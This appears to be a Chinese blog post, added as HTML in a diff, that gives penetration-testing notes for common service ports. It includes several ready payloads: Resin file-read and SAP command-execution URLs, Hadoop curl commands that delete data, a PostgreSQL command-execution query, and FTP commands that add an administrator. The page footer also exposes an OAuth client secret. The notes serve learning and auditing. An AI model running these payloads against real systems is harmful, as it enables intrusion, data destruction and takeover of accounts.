@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+ <head>
+     <meta charset="utf-8" />
+  <title>常见端口渗透笔录 | wonder&#39;s blog</title>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+  <link rel="stylesheet" href="https://wonder-zhang.github.io/styles/main.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+   <script src="https://cdn.staticfile.org/highlight.js/9.15.9/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+ </head>
+ <body>
+     <div class="sidebar animated fadeInDown">
+   <div class="logo-title">
+    <div class="title">
+     <img src="https://wonder-zhang.github.io/images/avatar.png?v=1594724275860" style="width:127px;" />
+
+     <h3 title=""><a href="/">wonder</a></h3>
+
+     <div class="description">
+      <p>Stay Hungry. Stay Foolish</p>
+     </div>
+    </div>
+   </div>
+   <ul class="social-links">
+
+
+    <li><a href="https://wonder-zhang.github.io/atom.xml"><i class="fa fa-rss"></i></a></li>
+ 
+    
+
+    
+
+    
+
+    <li><a href="https://github.com/wonder-zhang"><i class="fa fa-github"></i></a></li>
+ 
+    
+
+    
+
+    
+
+    
+
+    <li><a href="https://weibo.com/936659044"><i class="fa fa-weibo"></i></a></li>
+ 
+    
+
+    
+
+    
+
+   </ul>
+   <div class="footer">
+    <div class="by_farbox">
+   Powered by <a href="https://www.wonder1999.com" target="_blank">wonder</a>
+ <a class="rss" href="https://wonder-zhang.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+    </div>
+    
+
+    </div>
+   </div>
+  </div>
+  <div class="main">
+     <div class="page-top animated fadeInDown">
+    <div class="nav">
+    
+     <li><a  href="/">首页</a></li>
+
+     <li><a  href="/archives">归档</a></li>
+
+     <li><a  href="/tags">标签</a></li>
+
+    </div>
+    <div class="information">
+     <div class="back_btn">
+      <li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li>
+     </div>
+    </div>
+   </div>
+   <div class="autopagerize_page_element">
+    <div class="content">
+     <div class="post-page">
+      <div class="post animated fadeInDown">
+       <div class="post-title">
+        <h3><a>常见端口渗透笔录</a></h3>
+       </div>
+       <div class="post-content">
+        <h2 id="1-远程管理端口">1、远程管理端口</h2>
+<p><strong>22 端口（SSH）</strong></p>
+<pre><code>安全攻击：弱口令、暴力猜解、用户名枚举
+利用方式：
+1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，
+2、利用弱口令/暴力破解，获取目标主机权限。
+</code></pre>
+<p><strong>23 端口（Telnet）</strong></p>
+<pre><code>安全漏洞：弱口令、明文传输
+利用方式：
+1、通过弱口令或暴力破解，获取目标主机权限。
+2、嗅探抓取telnet明文账户密码。
+</code></pre>
+<p><strong>3389 端口（RDP）</strong></p>
+<pre><code>安全漏洞：暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限。
+5632 端口（Pcanywhere）
+安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限
+</code></pre>
+<p><strong>5900 端口（VNC）</strong></p>
+<pre><code>安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限。
+2、Web中间件/服务端口
+</code></pre>
+<p><strong>1090/1099 端口（RMI）</strong></p>
+<pre><code>安全漏洞：JAVA RMI 反序列化远程命令执行漏洞
+利用方式：使用nmap检测端口信息。
+端口信息：1099/1090    Java-rmi    Java RMI Registry
+检测工具：attackRMI.jar
+</code></pre>
+<p><strong>7001 端口（Weblogic）</strong></p>
+<pre><code>安全漏洞：弱口令、SSRF、反序列化漏洞
+利用方式：
+1、控制台弱口令上传war木马
+2、SSRF内网探测
+3、反序列化远程代码执行等
+</code></pre>
+<p><strong>8000 端口（jdwp）</strong></p>
+<pre><code>安全漏洞：JDWP 远程命令执行漏洞
+端口信息：
+    8000             jdwp           java Debug Wire Protocol
+检测工具：https://github.com/IOActive/jdwp-shellifier
+</code></pre>
+<p><strong>8080 端口（Tomcat）</strong></p>
+<pre><code>安全漏洞：弱口令、示例目录
+利用方式：通过弱口令登录控制台，上传war包。
+</code></pre>
+<p><strong>8080 端口（Jboss）</strong></p>
+<pre><code>安全漏洞：未授权访问、反序列化。
+利用方式：
+1、未授权访问控制台，远程部署木马
+2、反序列化导致远程命令执行等。
+检测工具：https://github.com/joaomatosf/jexboss
+</code></pre>
+<p><strong>8080 端口（Resin）</strong></p>
+<pre><code>安全漏洞：目录遍历、远程文件读取
+利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。
+
+任意文件读取POC：
+payload1 = &quot;/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd&quot;
+payload2 = &quot;/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd&quot;
+payload3 = &quot;/ ..\\\\web-inf&quot;
+</code></pre>
+<p><strong>8080 端口（Jetty）</strong></p>
+<pre><code>安全漏洞：远程共享缓冲区泄漏
+利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。
+检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script
+</code></pre>
+<p><strong>8080 端口（GlassFish）</strong></p>
+<pre><code>安全漏洞：弱口令、任意文件读取
+利用方式：
+1、弱口令admin/admin，直接部署shell
+2、任意文件读取获取服务器敏感配置信息
+</code></pre>
+<p><strong>8080 端口（Jenkins）</strong></p>
+<p><strong>安全漏洞：未授权访问 、远程代码执行<br>
+利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。<br>
+http://<target>:8080/manage<br>
+http://<target>:8080/script</strong></p>
+<p><strong>8161 端口（ActiveMQ）</strong></p>
+<pre><code>安全漏洞：弱口令、任意文件写入、反序列化
+利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。
+</code></pre>
+<p><strong>9043 端口（webSphere）</strong></p>
+<pre><code>安全漏洞：控制台弱口令、远程代码执行
+后台地址：https://:9043/ibm/console/logon.jsp
+</code></pre>
+<p><strong>50000 端口 （SAP）</strong></p>
+<pre><code>安全漏洞：远程代码执行
+利用方式：攻击者通过构造url请求，实现远程代码执行。
+POC:http://&lt;target&gt;:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all
+</code></pre>
+<p><strong>50070 端口（hadoop）</strong></p>
+<pre><code>安全漏洞：未授权访问
+利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。
+curl -i -X DELETE “http://ip:50070/webhdfs/v1/tmp?op=DELETE&amp;recursive=true“
+curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
+</code></pre>
+<h2 id="2-数据库端口">2、数据库端口</h2>
+<p><strong>389 端口（ldap）</strong></p>
+<pre><code>安全漏洞：未授权访问 、弱口令
+利用方式：通过LdapBrowser工具直接连入。
+</code></pre>
+<p><strong>1433 端口（Mssql）</strong></p>
+<pre><code>安全漏洞：弱口令、暴力破解
+利用方式：差异备份getshell、SA账户提权等
+</code></pre>
+<p><strong>1521 端口（Oracle）</strong></p>
+<pre><code>安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令/暴力破解进行入侵。
+</code></pre>
+<p><strong>3306 端口（MySQL）</strong></p>
+<pre><code>安全漏洞：弱口令、暴力破解
+利用方式：利用日志写入webshell、udf提权、mof提权等。
+</code></pre>
+<p><strong>5432 端口（ PostgreSQL）</strong></p>
+<pre><code>安全漏洞：弱口令、高权限命令执行
+利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。。
+PoC参考：
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+</code></pre>
+<p><strong>5984 端口（CouchDB）</strong></p>
+<pre><code>安全漏洞：垂直权限绕过、任意命令执行
+利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。
+后台访问：http://&lt;target&gt;:5984/_utils
+</code></pre>
+<p><strong>6379 端口（Redis）</strong></p>
+<pre><code>安全漏洞：未授权访问
+利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、
+公私钥认证获取root权限、主从复制RCE等。
+</code></pre>
+<p><strong>9200 端口（elasticsearch）</strong></p>
+<pre><code>安全漏洞：未授权访问、命令执行
+检测方式：
+1、直接访问如下url，获取相关敏感信息。
+http://&lt;target&gt;:9200/_nodes  查看节点数据
+http://&lt;target&gt;:9200/_river  查看数据库敏感信息
+2、通过构造特定的数据包，执行任意命令。
+</code></pre>
+<p><strong>11211 端口（MemCache）</strong></p>
+<pre><code>安全漏洞：未授权访问
+检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。
+nc -vv &lt;target&gt; 11211
+</code></pre>
+<p><strong>27017 端口（Mongodb）</strong></p>
+<pre><code>安全漏洞：未授权访问、弱口令
+利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。
+</code></pre>
+<h2 id="3-常见协议端口">3、常见协议端口</h2>
+<p><strong>21 端口（FTP)</strong></p>
+<pre><code>安全漏洞：1、配置不当    2、明文传输    3、第三方软件提权
+利用方式：
+1、匿名登录或弱口令
+2、嗅探ftp用户名和密码
+3、Serv-U权限较大的账号可导致系统命令执行。FTP提权命令：
+# 增加系统用户
+Quote site exec net user 4567 4567 /add
+# 提升到管理员权限
+Quote site exec net localgroup administrators 4567 /add
+</code></pre>
+<p><strong>25 端口（SMTP）</strong></p>
+<pre><code>攻击方式：1、匿名发送邮件 2、弱口令 3、SMTP用户枚举
+利用方式：
+1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。
+2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。
+3、通过SMTP用户枚举获取用户名：
+nmap -p 25 -- smtp-enum-users.nse &lt;target&gt;
+</code></pre>
+<p><strong>53 端口（DNS）</strong></p>
+<pre><code>安全攻击：1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒
+检测方式：
+1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。
+2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。
+3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。
+</code></pre>
+<p><strong>161 端口（SNMP）</strong></p>
+<pre><code>安全漏洞：默认团体名/弱口令访问
+利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。
+1、弱口令检测：nmap –sU –p161 –script=snmp-brute &lt;target&gt;
+2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr &lt;target&gt;
+3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user &lt;target&gt;
+4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat &lt;target&gt;
+</code></pre>
+<p><strong>443 端口（SSL）</strong></p>
+<pre><code>安全漏洞：OpenSSL 心脏出血
+利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。
+扫描脚本：nmap -sV --script=ssl-heartbleed &lt;target&gt;
+</code></pre>
+<p><strong>445 端口（SMB）</strong></p>
+<pre><code>安全漏洞：信息泄露、远程代码执行
+利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。
+</code></pre>
+<p><strong>873 端口（Rsync）</strong></p>
+<pre><code>安全漏洞：匿名访问、弱口令
+利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。
+1、下载：#rsync -avz a.b.c.d::path/file path/filiname  
+2、上传：#rsync -avz path/filename a.b.c.d::path/file
+</code></pre>
+<p><strong>2181 端口（Zookeeper）</strong></p>
+<pre><code>安全漏洞：未授权访问
+检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。
+echo envi | nc ip port
+</code></pre>
+<p><strong>2375 端口（Docker）</strong></p>
+<pre><code>安全漏洞：未授权方式
+检测方式：通过docker daemon api 执行docker命令。
+#列出容器信息，效果与docker ps -a 一致。
+curl http://&lt;target&gt;:2375/containers/json
+docker -H tcp://&lt;target&gt;:2375 start &lt;Container Id&gt;</code></pre>
+
+       </div>
+       <div class="post-footer">
+        <div class="meta">
+         <div class="info">
+          <i class="fa fa-sun-o"></i>
+          <span class="date">2020-07-14</span>
+          <i class="fa fa-tag"></i>
+          
+          <a class="tag" href="https://wonder-zhang.github.io/lJOJZ3res/" title="安全">安全 </a>
+          
+          <a class="tag" href="https://wonder-zhang.github.io/HnnDbkxKC/" title="web">web </a>
+          
+          <a class="tag" href="https://wonder-zhang.github.io/MlPEoUGcv/" title="linux">linux </a>
+          
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="share">
+       <div class="evernote">
+        <a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a>
+       </div>
+       <div class="weibo">
+        <a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a>
+       </div>
+       <div class="twitter">
+        <a class="fa fa-twitter" href="http://twitter.com/home?status=,https://wonder-zhang.github.io/Dcn-IN-fr/,;"></a>
+       </div>
+      </div>
+      <div class="pagination">
+       <ul class="clearfix">
+
+        
+        <li class="next pagbuttons"><a class="btn" role="navigation" href="https://wonder-zhang.github.io/FNn3N6XQI/" title=" “你没文化的样子，真掉价”：一场疫情，炸出了多少精神穷人">下一篇</a></li>
+        
+       </ul>
+      </div>
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '0a75e243e68be28523b4',
+    clientSecret: 'e012dd6788cbf27823b84f31f0f5227595824ffa',
+    repo: 'wonder-zhang.github.io',
+    owner: 'wonder-zhang',
+    admin: ['wonder-zhang'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+          
+        
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="https://wonder-zhang.github.io/media/scripts/jquery.js"></script>
+  <script src="https://wonder-zhang.github.io/media/scripts/jquery-migrate-1.2.1.min.js"></script>
+  <script src="https://wonder-zhang.github.io/media/scripts/jquery.appear.js"></script>
+
+
+ </body>
+</html>
